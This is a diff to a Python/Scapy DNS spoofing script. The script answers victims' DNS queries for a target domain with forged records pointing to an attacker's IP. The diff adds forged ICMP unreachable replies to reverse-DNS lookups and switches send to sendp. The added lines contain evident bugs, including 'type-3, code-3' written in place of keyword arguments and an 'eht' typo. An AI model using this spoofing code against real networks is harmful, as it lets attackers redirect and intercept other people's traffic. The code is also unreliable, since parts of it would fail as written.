@@ -61,6 +61,14 @@ def start_web_server(port, directory):
 # Function to handle DNS spoofing
 def dns_spoof(pkt):
     if DNS in pkt and pkt[DNS].qr == 0:  # QR == 0 means it's a DNS request
+        if "in-addr.arpa" in pkt[DNS].qd.qname.decode():
+            eth = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
+            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+            icmp = ICMP(type-3, code-3)
+            oip = pkt.getlayer(IP)
+            oudp = pkt.getlayer(UDP)
+            p = eht / ip / icmp / oip / oudp
+            sendp(p, iface="Ethernet0", verbose=0)
         if target_domain in pkt[DNS].qd.qname.decode():
             print(f"Spoofing DNS request for {target_domain}")
             # Construct the DNS response
@@ -69,7 +77,7 @@ def dns_spoof(pkt):
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                               an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=attacker_ip))
-            send(spoofed_pkt, verbose=0)
+            sendp(spoofed_pkt, verbose=0)
             print(f"Sent spoofed DNS response to {pkt[IP].src}")
 
 def stop_filter(pkt):
